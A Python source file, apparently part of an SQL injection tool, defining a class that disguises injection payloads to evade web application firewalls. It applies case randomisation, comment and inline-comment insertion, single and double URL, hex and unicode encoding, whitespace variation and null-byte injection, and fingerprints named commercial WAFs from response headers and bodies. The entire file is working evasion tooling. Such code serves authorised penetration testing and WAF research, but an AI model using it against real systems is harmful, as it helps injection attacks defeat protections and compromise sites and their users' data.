import random
import urllib.parse
import base64
import re
from typing import Dict, List, Optional
import logging

logger = logging.getLogger(__name__)


class WAFEvasion:
    """Enhanced WAF evasion with multiple sophisticated techniques"""
    
    def __init__(self, config: Dict):
        waf_config = config.get('waf_evasion', {})
        self.enabled = waf_config.get('enabled', False)
        self.technique = waf_config.get('technique', 'random')
        self.aggression_level = waf_config.get('aggression_level', 'medium')  # low, medium, high
        
        # Evasion statistics
        self.stats = {
            'total_evasions': 0,
            'techniques_used': {}
        }
        
        logger.info(f"WAF Evasion initialized: enabled={self.enabled}, technique={self.technique}, level={self.aggression_level}")
    
    def apply_evasion(self, payload: str, technique: Optional[str] = None) -> str:
        """
        Apply WAF evasion technique to payload.
        
        Args:
            payload: Original SQL injection payload
            technique: Specific technique to use, or None for configured default
            
        Returns:
            Evaded payload string
        """
        if not self.enabled:
            return payload
        
        # Use specified technique or fall back to configured one
        tech = technique or self.technique
        
        # Map aggression levels to technique combinations
        if tech == 'random' or tech not in self._get_available_techniques():
            tech = self._select_technique()
        
        self.stats['total_evasions'] += 1
        self.stats['techniques_used'][tech] = self.stats['techniques_used'].get(tech, 0) + 1
        
        # Apply the selected technique
        evaded = self._apply_technique(payload, tech)
        
        logger.debug(f"Applied {tech} evasion: {payload[:50]}... -> {evaded[:50]}...")
        return evaded
    
    def _select_technique(self) -> str:
        """Select technique based on aggression level"""
        low_risk = ['random_case', 'whitespace_variation', 'hex_encoding']
        medium_risk = low_risk + ['comment_injection', 'url_encoding', 'inline_comments']
        high_risk = medium_risk + ['double_encoding', 'unicode_encoding', 'mixed_encoding']
        
        if self.aggression_level == 'low':
            return random.choice(low_risk)
        elif self.aggression_level == 'high':
            return random.choice(high_risk)
        else:  # medium
            return random.choice(medium_risk)
    
    def _apply_technique(self, payload: str, technique: str) -> str:
        """Apply specific evasion technique"""
        techniques_map = {
            'random_case': self._random_case,
            'comment_injection': self._comment_injection,
            'url_encoding': self._url_encoding,
            'double_encoding': self._double_encoding,
            'hex_encoding': self._hex_encoding,
            'unicode_encoding': self._unicode_encoding,
            'whitespace_variation': self._whitespace_variation,
            'inline_comments': self._inline_comments,
            'mixed_encoding': self._mixed_encoding,
            'null_byte': self._null_byte_injection,
        }
        
        handler = techniques_map.get(technique, self._random_case)
        return handler(payload)
    
    def _random_case(self, payload: str) -> str:
        """Randomize case of SQL keywords"""
        result = []
        for char in payload:
            if char.isalpha():
                result.append(char.upper() if random.random() > 0.5 else char.lower())
            else:
                result.append(char)
        return ''.join(result)
    
    def _comment_injection(self, payload: str) -> str:
        """Inject MySQL-style comments to break patterns"""
        # Replace spaces with /**/ comments
        result = payload.replace(' ', '/**/')
        
        # Add random comments between characters for high aggression
        if self.aggression_level == 'high' and random.random() > 0.5:
            result = self._add_random_comments(result)
        
        return result
    
    def _url_encoding(self, payload: str) -> str:
        """URL encode the payload"""
        return urllib.parse.quote(payload)
    
    def _double_encoding(self, payload: str) -> str:
        """Apply double URL encoding"""
        encoded_once = urllib.parse.quote(payload)
        return urllib.parse.quote(encoded_once)
    
    def _hex_encoding(self, payload: str) -> str:
        """Convert string to hex representation (e.g., 'admin' -> 0x61646d696e)"""
        # For SQL strings, convert to hex
        if "'" in payload or '"' in payload:
            # Extract quoted strings and convert them
            result = payload
            for match in re.finditer(r"'([^']*)'", payload):
                original = match.group(0)
                content = match.group(1)
                hex_version = '0x' + content.encode().hex()
                result = result.replace(original, hex_version, 1)
            return result
        return payload
    
    def _unicode_encoding(self, payload: str) -> str:
        """Use Unicode encoding for certain characters"""
        result = []
        for char in payload:
            if random.random() > 0.7 and char.isalpha():
                # Unicode escape
                result.append(f"\\u{ord(char):04x}")
            else:
                result.append(char)
        return ''.join(result)
    
    def _whitespace_variation(self, payload: str) -> str:
        """Replace spaces with alternative whitespace characters"""
        alternatives = [' ', '\t', '\n', '\r', '/**/']
        result = []
        
        for char in payload:
            if char == ' ':
                result.append(random.choice(alternatives))
            else:
                result.append(char)
        
        return ''.join(result)
    
    def _inline_comments(self, payload: str) -> str:
        """Insert inline comments within SQL keywords"""
        # Split on SQL keywords and inject comments
        keywords = ['SELECT', 'UNION', 'WHERE', 'FROM', 'AND', 'OR']
        result = payload
        
        for keyword in keywords:
            # Case-insensitive replacement with comment injection
            pattern = re.compile(re.escape(keyword), re.IGNORECASE)
            matches = list(pattern.finditer(result))
            
            for match in reversed(matches):  # Reverse to maintain indices
                original = match.group(0)
                # Insert comment in middle of keyword
                mid = len(original) // 2
                commented = original[:mid] + '/**/' + original[mid:]
                result = result[:match.start()] + commented + result[match.end():]
        
        return result
    
    def _mixed_encoding(self, payload: str) -> str:
        """Apply multiple encoding techniques randomly"""
        # Apply 2-3 random techniques
        techniques = ['random_case', 'comment_injection', 'whitespace_variation']
        num_techniques = random.randint(2, 3)
        
        result = payload
        for _ in range(num_techniques):
            tech = random.choice(techniques)
            result = self._apply_technique(result, tech)
        
        return result
    
    def _null_byte_injection(self, payload: str) -> str:
        """Inject null bytes (%00) in strategic positions"""
        # Insert null bytes before critical characters
        critical_chars = ['\'', '"', ')', ';']
        result = []
        
        for char in payload:
            if char in critical_chars and random.random() > 0.5:
                result.append('%00')
            result.append(char)
        
        return ''.join(result)
    
    def _add_random_comments(self, payload: str, max_comments: int = 5) -> str:
        """Add random comments throughout the payload"""
        chars = list(payload)
        num_comments = random.randint(1, min(max_comments, len(chars) // 2))
        
        # Choose random positions
        positions = random.sample(range(len(chars)), num_comments)
        
        # Insert comments (in reverse order to maintain indices)
        for pos in sorted(positions, reverse=True):
            chars.insert(pos, '/**/')
        
        return ''.join(chars)
    
    def _get_available_techniques(self) -> List[str]:
        """Get list of available evasion techniques"""
        return [
            'random_case', 'comment_injection', 'url_encoding', 'double_encoding',
            'hex_encoding', 'unicode_encoding', 'whitespace_variation',
            'inline_comments', 'mixed_encoding', 'null_byte'
        ]
    
    def get_stats(self) -> Dict:
        """Get evasion statistics"""
        return self.stats.copy()
    
    def detect_waf_signature(self, response_text: str, status_code: int, headers: Dict) -> Optional[str]:
        """
        Attempt to detect WAF based on response characteristics.
        
        Returns:
            WAF name if detected, None otherwise
        """
        # Common WAF signatures
        waf_signatures = {
            'Cloudflare': ['cf-ray', 'cloudflare'],
            'AWS WAF': ['x-amzn-requestid', 'x-amz-cf-id'],
            'Akamai': ['akamai', 'x-akamai'],
            'Imperva': ['x-cdn', 'incapsula'],
            'ModSecurity': ['mod_security', 'modsecurity'],
            'F5 BIG-IP': ['bigipserver', 'f5'],
            'Barracuda': ['barracuda'],
            'Sucuri': ['x-sucuri'],
            'Wordfence': ['wordfence'],
        }
        
        # Check headers
        header_str = str(headers).lower()
        for waf_name, signatures in waf_signatures.items():
            if any(sig in header_str for sig in signatures):
                logger.info(f"WAF detected: {waf_name}")
                return waf_name
        
        # Check response body
        if response_text:
            response_lower = response_text.lower()
            for waf_name, signatures in waf_signatures.items():
                if any(sig in response_lower for sig in signatures):
                    logger.info(f"WAF detected (in body): {waf_name}")
                    return waf_name
        
        # Check for generic WAF response patterns
        if status_code == 403:
            generic_patterns = ['blocked', 'forbidden', 'access denied', 'firewall']
            if any(pattern in response_text.lower() for pattern in generic_patterns):
                logger.info("Generic WAF detected (403 + block message)")
                return 'Generic WAF'
        
        return None